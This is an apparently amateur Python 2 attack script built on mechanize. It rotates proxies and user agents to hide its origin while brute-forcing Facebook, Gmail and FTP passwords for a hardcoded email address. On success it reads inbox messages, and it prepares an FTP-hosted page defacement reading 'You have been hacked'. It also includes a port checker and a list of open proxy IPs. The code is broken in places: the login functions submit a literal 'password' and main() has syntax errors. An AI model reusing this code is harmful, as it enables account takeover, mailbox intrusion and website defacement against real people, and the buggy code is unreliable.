import mechanize
import time
import random
import cookielib
import socket
import re
from BeautifulSoup import BeautifulSoup
import optparse
from mechanize._request import Request
from bs4 import BeautifulSoup

import os


class Anon(mechanize.Browser):
    # Browser
    def __init__(self, proxies={}, useragent=[]):
        mechanize.Browser.__init__(self)
        self.proxies = proxies
        self.set_handle_robots(False)
        self.useragent = useragent

    #random for useragent
    def testuseragent(self):

        index = random.randrange(0, len(self.useragent))
        print "useragent's index in file is :  ", index
        print "useragent's name is: ", useragent[index]
        self.addheaders = [('User-agent', useragent[index])]

    #random for proxy
    def testproxy(self):

        index = random.randrange(0, len(self.proxies))
        print "proxy's index is: ", index
        print "proxy is: ", proxies[index]
        if self.proxies:
            self.set_proxies(proxies[index])

    #Cookie Jar
    def cookiechanger(self):
        self.cookie_jar = cookielib.LWPCookieJar()
        self.set_cookiejar(self.cookie_jar)

    #our anomizer
    def anonymize(self, sleep=False):
        self.cookiechanger()
        self.testuseragent()
        self.testproxy()
        if sleep:
            time.sleep(60)

    #connect to whatsmyip.us for checking our ip
    def connect_my_ip(self):
        x = self.open("http://www.whatsmyip.us/")
        print x.read()

    #choose your action
    def generation_password(self):
        import string

        print "what kind of password would you like to create?"
        print "1.just letters"
        print "2.only numbers"
        print "3.numbers and letters"

        x = int(raw_input("please enter your choice 1-4: "))

        length = int(raw_input("please enter length of the password:"))
        amount = int(raw_input("please enter the number of password:"))

        if x == 1:
            alphabet = string.letters
            print alphabet
        if x == 2:
            alphabet = string.digits
            print alphabet
        if x == 3:
            alphabet = string.digits + string.letters[0:52]

        file = open("passwords.txt", "a")

        string = ""
        for count in range(amount):
            string = ""
            for i in random.sample(alphabet, length):
                string += i
            print string
            file.write(string + '\n')

        file.close()

    #check password for connection (for facebook)
    def password(self):
        pf = open("passwords.txt", 'r')
        for line in pf.readlines():
            line_password = line.strip('\r').strip('\n')

            try:
                self.anonymize()
                self.connect_to_facebook(password=line_password)
                print "[*]  The password is correct"
                break
            except:
                print "[*]password is incorrect"

    #check password for connection (for gmail)
    def password_gmail(self):
        pf = open("passwords.txt", 'r')
        for line in pf.readlines():
            line_password = line.strip('\r').strip('\n')
            self.anonymize()
            try:
                self.connect_to_gmail(password=line_password)
                print "[*]  The password is correct"
                # Filter all links to mail messages in the inbox
                all_msg_links = [l for l in self.links(url_regex='\?v=c&th=')]
                # Select the first 3 messages
                for msg_link in all_msg_links[0:3]:
                    print msg_link
                    # Open each message
                    self.follow_link(msg_link)
                    html = self.response().read()
                    soup = BeautifulSoup(html)
                    # Filter html to only show the message content
                    msg = str(soup.findAll('div', attrs={'class': 'msg'})[0])
                    # Show raw message content
                    print msg
                    # Convert html to text, easier to read but can fail if you have intl
                    # chars
                    #   print html2text.html2text(msg)
                    print
                    # Go back to the Inbox
                    self.follow_link(text='Inbox')

                # Logout
                self.follow_link(text='Sign out')
            except:
                print "[*]password is incorrect"


    #connection to facebook
    def connect_to_facebook(self, password):
        self.open('https://www.facebook.com/login.php')
        # Select the first (index zero) form
        self.select_form(nr=0)
        # User credentials
        self.form['email'] = 'galiya8@gmail.com'
        self.form['pass'] = 'password'
        # Login
        response_facebook = self.submit()
        print response_facebook.read()

    #connection to gmail
    def connect_to_gmail(self, password):
        self.open('http://gmail.com')
        # Select the first (index zero) form
        self.select_form(nr=0)
        # User credentials
        self.form['Email'] = 'galiya8@gmail.com'
        self.form['Passwd'] = 'password'
        # Login
        response_gmail = self.submit()
        print response_gmail.read()
        # print response_gmail.code

    def check_port(self, ip, port):
        self.ip = ip
        self.port = port
        try:
            socket.setdefaulttimeout(5) #sets time out for socket
            s = socket.socket() #creats a socket
            s.connect((self.ip, self.port)) #connects
            print "port", self.port, "open"
        except:  #if port not open
            print "port", self.port, "is closed"

    def printLinks(self, url):
        self.url = url
        br = Anon(useragent, proxies)
        page = br.open(url)
        html = page.read()
        try:
            print '[ + ] Printing Links From Regex.'
            link_finder = re.compile('href = "(.*?)"')
            links = link_finder.findall(html)
            for link in links:
                print link
        except:
            pass
        try:
            print '\n[+] Printing Links From BeautifulSoup.'
            soup = BeautifulSoup(html)
            links = soup.findAll(name='a')
            for link in links:
                if link.has_key('href'):
                    print link['href']
        except:
            pass

        def main():
            parser = optparse.OptionParser('usage%prog ' + '-u <target url>')
            parser.add_option('-u'. dest == 'tgtURL'.type ==  'string'. \
                help == 'specify target url')
            (options, args) = parser.parse_args()
            url = options.tgtURL
            if url == None:
                print parser.usage
                exit(0)
            else:
                print links(url)
            if __name__ == '__main__':
                main()

    def change_data_file(self, login_to_server, ip, file_name, ):
        self.login_to_server = login_to_server
        # self.pas_for_ftp = pas_for_ftp
        self.ip = ip
        self.file_name = file_name


        file = "pasw.txt"
        br = Anon(useragent, proxies)
        pf = open(file, 'r') #open a password file
        for line in pf.readlines():
            pas_for_ftp = line.strip('\r').strip('\n')
            try:
                print "login_to_server - ", self.login_to_server
                # print "pas_for_ftp - ", self.pas_for_ftp
                print "IP - ", self.ip
                print "file_name - ", self.file_name

                url = "ftp://" + self.login_to_server + ":" + pas_for_ftp + "@" + self.ip + "/"
                print url
                url2 = url + self.file_name
                print url2

                response = br.open(url2)
                soup = BeautifulSoup(response.get_data())
                b = soup.prettify()
                tag = soup.body
                tag.clear()
                soup = BeautifulSoup("<body></body>")
                original_tag = soup.body
                new_tag = soup.new_tag("p")
                original_tag.append(new_tag)
                tag = soup.p
                tag.string = "You have been hacked"
                a = soup.prettify()
                print "File on server: ", b
                print "File's change: ", a
                request = Request(url2, data=b)
                request.get_host()
                request.get_data()
                print "Done!"
                break



                # response = br.open(url2)
                # html = br.response().get_data().replace("</b>", "< /b>")
                # response = mechanize.make_response(html, [("Content-Type", "text/html")], url2 , 200, "OK")
                # br.set_response(response)



                # html = br.response().get_data().replace(b, a)
                # response = mechanize.make_response(html, [("Content-Type", "text/html")], url2 , 200, "OK")
                # br.set_response(response)
                # html2 = br.request().get_data().replace(b, a)
                # mechanize.request_host(html2)
            except:
                print "[*]password", pas_for_ftp, "is incorrect"


useragent = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
             'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
             'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
             'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
             'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
             'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
             'Microsoft Internet Explorer/4.0b1 (Windows 95)',
             'Opera/8.00 (Windows NT 5.1; U; en)',
             'amaya/9.51 libwww/5.4.0',
             'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
             'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
             'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
             'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
             'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
             'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']

proxies = [{"http": "95.181.33.22:8080"}, {"http": "61.152.108.187:80"}, {"http": "60.51.218.180:8080"},
           {"http": "2.51.88.131:8118"}, {"http": "194.141.96.88:8080"}, {"http": "37.187.101.139:8118"},
           {"http": "24.234.185.226:36530"}, {"http": "85.185.45.23:80"}, {"http": "176.212.62.236:3128"},
           {"http": "195.78.244.10:1080"}, {"http": "212.154.154.220:8080"}]
